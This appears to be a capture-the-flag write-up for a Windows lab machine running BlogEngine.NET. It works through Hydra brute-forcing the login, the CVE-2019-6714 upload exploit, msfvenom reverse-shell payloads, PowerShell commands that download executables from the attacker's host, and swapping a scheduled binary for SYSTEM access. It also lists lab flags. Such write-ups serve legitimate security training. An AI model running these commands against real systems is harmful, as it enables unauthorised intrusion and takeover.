![clown](./images/image.axd.jpeg)
#### [nmap.init.out](./nmap.init.out.txt)
#### [gobuster.out](./gobuster.txt)
#### [revshell.exe.zip](./revshell.exe.zip)
#### [rshell.exe.zip](./rshell.exe.zip)
#### [PostView.ascx](./PostView.ascx)
#### [winPEAS.bat.zip](./winPEAS.bat.zip)
#### [windows-exploit-suggester](./windows-exploit-suggester.py)
#### [winpeas.out.txt](./winpeas.out.txt)
#### [winpeas.out2.txt](./winpeas.out2.txt)


export ip=10.10.129.6

# task 1

> Whats the name of the clown displayed on the homepage?
pennywise

google image search


# task 2 - Using Hydra to brute-force a login

# What request type is the Windows website login form using?
POST
- using burpsuite to intercept the submit, but most forms would be using POST anyways

- start brute-forcing an account
`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.35.61 http-post-form '/Acount/login.aspx?ReturnURL=/admin:__VIEWSTATE=ZVTcmd%2B5%2Bjfwtfg9sZ7QdIEYu%2BKqSKDHz2qKighXXGxK76teI2jajTplUYwNd9kFWKn0YVwYyMEZH4F%2BDJEys54Lfj%2BnvsAysXfb%2BTvOPkp7KTz%2BCSgMmx43vb9b3ABcq0lBuzMnVTO7DkYO2vta1%2BY77hZ8%2FGwUKavMI%2BENuZaO3hmu&__EVENTVALIDATION=pmtNt%2Bz0ceNGMMB5hR2sItY4jTXUwvC7FlpMUTcMv%2BTGdbvyPpa0W0JKvxGvgNSrlSag2exgVIUQJv3V%2B5m3S4nu4TxZwW4G1Ovn7N4dFpTO9Fm%2B6sY9V0Kv6DtWolIxxuLnr01bHUcp9J%2F6Vax7QL%2BxLlWmK0TQtnU38VsoSRa8%2BRUX&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:login failed' -vv`

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-24 14:53:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.35.61:80/Acount/login.aspx?ReturnURL=/admin:__VIEWSTATE=ZVTcmd%2B5%2Bjfwtfg9sZ7QdIEYu%2BKqSKDHz2qKighXXGxK76teI2jajTplUYwNd9kFWKn0YVwYyMEZH4F%2BDJEys54Lfj%2BnvsAysXfb%2BTvOPkp7KTz%2BCSgMmx43vb9b3ABcq0lBuzMnVTO7DkYO2vta1%2BY77hZ8%2FGwUKavMI%2BENuZaO3hmu&__EVENTVALIDATION=pmtNt%2Bz0ceNGMMB5hR2sItY4jTXUwvC7FlpMUTcMv%2BTGdbvyPpa0W0JKvxGvgNSrlSag2exgVIUQJv3V%2B5m3S4nu4TxZwW4G1Ovn7N4dFpTO9Fm%2B6sY9V0Kv6DtWolIxxuLnr01bHUcp9J%2F6Vax7QL%2BxLlWmK0TQtnU38VsoSRa8%2BRUX&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:login failed
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 1728.00 tries/min, 1728 tries in 00:01h, 14342671 to do in 138:21h, 16 active
[STATUS] 1733.33 tries/min, 5200 tries in 00:03h, 14339199 to do in 137:53h, 16 active
[STATUS] 1726.29 tries/min, 12084 tries in 00:07h, 14332315 to do in 138:23h, 16 active
[80][http-post-form] host: 10.10.35.61   login: admin   password: <div><embed src=\\
[STATUS] attack finished for 10.10.35.61 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-24 15:05:40
```


# Guess a username, choose a password wordlist and gain credentials to a user account!
1qaz2wsx

# task 3 - Compromise the machine

> Now you have logged into the website, are you able to identify the version of the BlogEngine?
3.3.6.0

In the About page

> What is the CVE?
CVE-2019-6714

```
└─$ searchsploit blogengine
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
BlogEngine 3.3 - 'syndication.axd' XML External Entity Injection                                                            | xml/webapps/48422.txt
BlogEngine 3.3 - XML External Entity Injection                                                                              | windows/webapps/46106.txt
BlogEngine 3.3.8 - 'Content' Stored XSS                                                                                     | aspx/webapps/48999.txt
BlogEngine.NET 1.4 - 'search.aspx' Cross-Site Scripting                                                                     | asp/webapps/32874.txt
BlogEngine.NET 1.6 - Directory Traversal / Information Disclosure                                                           | asp/webapps/35168.txt
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                                          | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution                                          | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                                                     | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution                                     | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                                                  | aspx/webapps/47014.py
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
- Who is the webserver running as?

```
└─$ searchsploit -m aspx/webapps/46353.cs                                                                                                                 2 ⨯
  Exploit: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46353
     Path: /usr/share/exploitdb/exploits/aspx/webapps/46353.cs
File Type: HTML document, ASCII text

Copied to: /home/parallels/thm/hackpark/46353.cs

```

- renamed the file to PostView.ascx and change the ip and port number, then upload and run according to the instruction inside

```
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```


# task 4 - Windows Privilege Escalation

> What is the OS version of this windows machine?

- generate revshell.exe

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.240.61 LPORT=8989 -f exe -o revshell.exe
```

- upload revshell using the same web interface

- reverse shell listener
```
> use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST LPORT
```

- the file should end up in `C:\inetpub\wwwroot\App_Data\files > revshell.exe`, run it to get a reverse shell
or hosting it using python then download to `C:\Windows\Temp` by running:
```
powershell -c "Invoke-WebRequest -Uri 'http://10.8.240.61:8000/revshell.exe' -OutFile 'C:\Windows\Temp\revshell.exe'"
powershell -c "Invoke-WebRequest -Uri 'http://10.8.240.61:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
```
then run it to get a reverse shell


# What is the OS version of this windows machine?
Windows 2012 R2 (6.3 Build 9600)

run `sysinfo`

# What is the name of the abnormal service running?
WindowsScheduler

Run winpeas or `ps`, and see if `wservice` or `wScheduler` running
If it is, see what tasks are being run, check the log and see how frequent what is being run etc. In this case, inside
`C:\Program Files (x86)\SystemScheduler\Events\20198415519.INI_LOG.txt`

`Message.exe` is being run every 30s; replacing that with revshell, then can get a shell as SYSTEM

# What is the name of the binary you're supposed to exploit?
Message.exe
```
mv Message.exe Message.bat

# in a shell on the target machine
powershell -c "Invoke-WebRequest -Uri 'http://10.8.240.61:8000/revshell.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"

#wait for it to run, should get a new meterpreter shell session as Administrator when it runs

```

# What is the user flag (on Jeffs Desktop)?

```
C:\Users\jeff\Desktop>type user.txt
type user.txt
759bd8af507517bcfaede78a21a73e39
```

# What is the root flag?

```
C:\Users\Administrator>type Desktop\root.txt
type Desktop\root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72
```


# task 5 - Privilege Escalation Without Metasploit


- generate revshell.exe

```
msfvenom -p windows/shell_reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.240.61 LPORT=8989 -f exe -o revshell.exe
```